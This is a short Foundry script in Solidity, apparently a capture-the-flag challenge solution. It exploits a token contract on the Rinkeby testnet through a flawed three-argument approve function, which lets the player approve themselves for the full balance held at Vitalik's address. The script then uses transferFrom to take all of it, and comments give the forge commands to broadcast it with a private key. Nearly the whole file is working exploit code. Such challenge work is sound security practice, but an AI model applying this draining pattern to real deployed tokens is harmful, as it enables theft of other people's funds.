// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../test/Challenge0.t.sol";

// source .env && forge script script/Challenge0.s.sol:Challenge0Script --rpc-url $RINKEBY_RPC_URL --broadcast --private-key $ETH_PRIV_KEY --etherscan-api-key $ETHERSCAN_API_KEY -vvvv
// source .env && forge script script/Challenge0.s.sol:Challenge0Script --fork-url $RINKEBY_RPC_URL --private-key $ETH_PRIV_KEY -vvvv
contract Challenge0Script is Script {
    address private player;
    IERC20 private target;
    address private vitalik;

    function setUp() public {
        player = tx.origin;
        target = IERC20(0x53A8d144B0e886110FaA1Fc1dB9B2D696E823a55);
        vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
    }

    function run() public {
        vm.startBroadcast();

        uint256 balance = target.balanceOf(vitalik);
        address(target).call(abi.encodeWithSignature("approve(address,address,uint256)", vitalik, player, balance));
        target.transferFrom(vitalik, player, balance);

        require(target.balanceOf(player) == balance, "Player must have all the balance");
        vm.stopBroadcast();
    }
}